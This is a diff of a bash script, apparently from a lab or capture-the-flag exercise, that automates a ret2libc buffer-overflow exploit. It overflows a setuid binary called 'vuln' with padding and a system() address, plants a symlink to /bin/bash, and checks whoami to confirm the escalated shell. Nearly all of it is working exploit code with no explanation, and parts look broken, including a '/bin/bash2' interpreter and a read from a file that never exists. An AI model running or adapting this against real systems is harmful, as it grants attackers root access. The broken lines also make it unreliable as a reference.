@@ -1,11 +1,12 @@
-#!/bin/bash
-gcc -o vuln vuln.c
-chmod +s vuln
-gcc -o ./getaddr getaddr.c -lc -ldl
-/bin/bash2
+#!/bin/bash2
 export PATH=$PATH:.
-sysaddr=$(./getaddr)
-./vuln "$(perl -e 'print "A"x84 . pack("V", hex("$(<sysaddr)"))')" 2> arg
-xxd arg | awk '{for(i=2; i<=NF; i++) {if ($i == "3a20") {print $(i-1); print $i; print $(i+1); print $(i+2); print $(i+3); print $(i+4); print $(i+5); print $(i+6);}}}' | perl -pe 's/(..)(..)(..)(..)/\\x$4\\x$3\\x$2\\x$1/g'
-./vuln "$(perl -e 'print "A"x84 . pack("V", hex("$(<sysaddr)"))')"
+export sysaddr=$(./getaddr)
+export hexaddr=$(echo -n "$sysaddr" | tac -rs .. | sed 's/../\\x&/g')
+./vuln $(perl -e "printf 'A'x84 . \"$hexaddr\"") 2> arg
+export arghex=$(xxd arg)
+#issue
+export argspl=$(echo "$arghex" | sed -n 's/.*3a20\(.*\)3a20.*/\1/p')
+export result=$(echo $argspl | sed 's/ //g' | sed 's/../\\x&/g')
+ln -s /bin/bash `perl -e "printf \"$result\""`
+./vuln $(perl -e "printf 'A'x84 . \"$hexaddr\"")
 whoami
